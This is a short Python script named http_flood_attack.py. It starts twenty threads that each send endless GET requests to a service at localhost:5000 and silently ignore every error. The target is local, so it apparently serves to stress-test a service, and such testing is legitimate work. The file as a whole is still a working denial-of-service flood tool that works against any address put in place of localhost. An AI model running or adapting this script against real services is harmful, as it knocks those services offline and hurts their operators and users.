# http_flood_attack.py
import requests
import threading
import time

def http_flood():
    while True:
        try:
            requests.get('http://localhost:5000')
        except:
            pass
        time.sleep(0.01)

# Create multiple threads
for _ in range(20):
    threading.Thread(target=http_flood).start()